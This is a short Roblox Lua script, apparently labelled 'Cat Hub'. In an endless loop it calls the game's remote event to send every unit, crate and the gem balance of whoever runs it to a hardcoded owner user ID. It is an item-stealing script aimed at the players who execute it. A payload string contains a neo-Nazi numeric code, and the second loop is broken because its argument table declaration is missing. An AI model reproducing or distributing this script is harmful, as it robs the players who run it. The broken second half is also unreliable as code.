local owneruserid = 4051282350
while wait() do
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Lobby.PostOffice.Menus.SendPackages.PlayerUnits.PlayerUnits:GetChildren()) do
local args = {
    [1] = {
        [1] = {
            [1] = "1488xddd", 
            [2] = owneruserid,
            [3] = "Troops",
            [4] = v.Name,
            [5] = game.Players.LocalPlayer.leaderstats.Gems.Value,
            [6] = "Cat Hub"
        },
        [2] = "FI"
    }
}
 
game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
end
for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Lobby.PostOffice.Menus.SendPackages.PlayerUnits.PlayerUnits:GetChildren()) do
       [1] = {
            [1] = "1488xddd",
            [2] = owneruserid,
            [3] = "Crates",
            [4] = v.Name,
            [5] = game.Players.LocalPlayer.leaderstats.Gems.Value,
            [6] = "Cat Hub"
        },
        [2] = "10"
    }
}
 
game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
end
end